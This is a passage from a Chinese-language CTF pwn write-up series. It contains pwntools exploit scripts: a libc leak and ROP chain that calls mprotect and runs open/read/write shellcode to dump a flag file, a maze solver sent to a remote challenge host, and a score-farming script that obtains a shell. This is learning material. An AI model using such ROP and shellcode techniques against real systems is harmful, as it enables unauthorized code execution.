main_sym = elf.symbols['main']

p.sendafter(b'number :', p64(close_got))
p.sendafter(b'byte :', b'\xc0')

payload = b'a' * 0x18 + p64(ret) + p64(main_sym)

p.send(payload)

p.recvuntil(b'a' * 0x18)
p.recv(0xb8 - 0x18)
real_main = u64(p.recv(6) + b'\x00\x00') - 139
base = real_main - libc.symbols['__libc_start_main']
log.success('real_main: ' + hex(real_main))
log.success('base: ' + hex(base))
# pause()

p.sendafter(b'number :', p64(0x404000 + 0x800))
p.sendafter(b'byte :', b'\x70')

pop_rdi = base + libc.search(asm('pop rdi; ret')).__next__()
pop_rsi = base + libc.search(asm('pop rsi; ret')).__next__()
pop_rax = base + libc.search(asm('pop rax; ret')).__next__()
pop_rdx = base + libc.search(asm('pop rdx; ret')).__next__()
xchg_edx_eax = base + 0x01a7f27 # libc.search不知道为什么search不到，这里直接用的wp中的值

open_ = base + libc.symbols['open']
read_ = base + libc.symbols['read']
mprotect = base + libc.symbols['mprotect']

log.success('pop_rdi: ' + hex(pop_rdi))
log.success('pop_rsi: ' + hex(pop_rsi))
log.success('pop_rax: ' + hex(pop_rax))
log.success('xchg_edx_eax: ' + hex(xchg_edx_eax))
log.success('pop_rdx: ' + hex(pop_rdx))
log.success('open: ' + hex(open_))
log.success('read: ' + hex(read_))
log.success('mprotect: ' + hex(mprotect))

# pause()

payload = b'a' * 0x18
payload += p64(pop_rdi) + p64(base + 0x1000)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rax) + p64(7) + p64(xchg_edx_eax)
payload += p64(mprotect)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(base + 0x1000)
payload += p64(pop_rax) + p64(0x1000) + p64(xchg_edx_eax)
payload += p64(read_)
payload += p64(base + 0x1000) # 这里最后还不清楚为什么要加起始位置

p.send(payload)

shellcode = shellcraft.open('./flag', 0, 0)
shellcode += shellcraft.read('rax', base + 0x1800, 0x100)
shellcode += shellcraft.write(2, base + 0x1800, 'rax')

p.send(asm(shellcode))

p.interactive()
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241031164815.png)
# Week 4
## PWN
### Maze_Rust
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241022151223.png)
运行程序，发现输入1可以生成迷宫，输入3是查看迷宫
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241022151340.png)
输入wasd可以移动
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241022151406.png)
那么这一部分可以编程解决，让其将迷宫走出。
输入2，他会要求我们输入一个神秘代码
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241022151452.png)
根据我的常识和提示，神秘数字必定是0721
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241022151528.png)
事实证明确实如此。很抱歉没能在别的地方找到这个神秘数字该怎么正常获得不过 orz
exp:
```python
from pwn import *

def parse_maze(maze):
    return [list(row.decode()) for row in maze]

def find_start_and_goal(maze):
    start = None
    goal = None
    for i, row in enumerate(maze):
        for j, cell in enumerate(row):
            if cell == 'P':
                start = (i, j)
            elif cell == 'G':
                goal = (i, j)
    return start, goal

def is_valid_move(maze, x, y, visited):
    return 0 <= x < len(maze) and 0 <= y < len(maze[0]) and maze[x][y] != '#' and (x, y) not in visited

def dfs(maze, x, y, goal, path, visited):
    if (x, y) == goal:
        return True
    visited.add((x, y))
    directions = [(-1, 0, 'w'), (1, 0, 's'), (0, -1, 'a'), (0, 1, 'd')]
    for dx, dy, direction in directions:
        nx, ny = x + dx, y + dy
        if is_valid_move(maze, nx, ny, visited):
            path.append((nx, ny, direction))
            if dfs(maze, nx, ny, goal, path, visited):
                return True
            path.pop()
    return False

def solve_maze(maze):
    maze = parse_maze(maze)
    start, goal = find_start_and_goal(maze)
    if not start or not goal:
        return None
    path = [(start[0], start[1], '')]
    visited = set()
    if dfs(maze, start[0], start[1], goal, path, visited):
        return path
    return None

def path_to_directions(path):
    directions = [step[2] for step in path if step[2]]
    return ''.join(directions)

def print_maze_with_path(maze, path):
    maze = parse_maze(maze)
    for x, y, _ in path:
        if maze[x][y] not in ('P', 'G'):
            maze[x][y] = '.'
    for row in maze:
        print(''.join(row))

context(os='linux', arch='amd64', log_level='DEBUG')
local = False
if local:
    p = process('./Maze_Rust')
else:
    p = remote('8.147.129.74', 36911)
p.recvuntil(b'Handle The Maze\n')
p.sendline(b'0721')
p.recvuntil(b'Handle The Maze\n')
p.sendline(b'1')
p.recvuntil(b'Handle The Maze\n')
p.sendline(b'3')
maze = p.recvuntil(b'You can').split(b'\n')[:-1]

path = solve_maze(maze)
if path:
    print_maze_with_path(maze, path)
    directions = path_to_directions(path)
    print("Directions:", directions)
else:
    print("No path found")

p.recvuntil(b'Pls input your path: ')
for i in directions[:-1]:
    p.sendline(i.encode())
    p.recvuntil(b'Handle The Maze\n')
    p.sendline(b'3')
    p.recvuntil(b'Pls input your path: ')
p.sendline(directions[-1].encode())

p.interactive()
```
![](https://raw.githubusercontent.com/LH864042219/PWN-Obsidian/refs/heads/main/picture/Pasted%20image%2020241022152010.png)
走迷宫的算法我直接让copilot代为生成，实际采用广搜或深搜都可以，找到一条路然后将路径转为wasd保留即可。
### MakeHero(复现)
### reread(复现)
### Sign in(复现)
看完wp有点绷不住，对战系统，赢了加分，输了扣分，敌方随机，总分达到1145以上就可以获取shell，解题方法：赢了存档，输了读档。~~游戏还是玩少了，这没想到~~
exp:
```python
from pwn import *
import pwnlib.gdb

context.log_level = 'debug'
local = True
if local:
    p = process('./Signin')
    # pwnlib.gdb.attach(p, 'b main')
else:
    p = remote('ctf.yuawn.id', 8009)
p.recvuntil('name: ')
p.sendline(b'lh')
p.sendline(b'6')
p.sendline()
# Berserker
score = 0
while score <= 1145:
    log.success('score: %d' % score)
    is_win = False
    p.sendline(b'1')
    p.sendlineafter(b'class:', 'Berserker')
    p.recvline()
    re = p.recv()
    if b'You beated' in re:
        score += 5
        is_win = True
    p.sendline()
    p.sendline()
    if score > 1145:
        p.interactive()
        break
    if is_win:
        p.sendline(b'6')
        p.sendline()
    else:
        p.sendline(b'5')
        p.sendline()
```
# Week 5
## PWN
### C_or_CPP(复现)
### EldenRing(复现)
### No Output(复现)
### Simple_Shellcode(复现)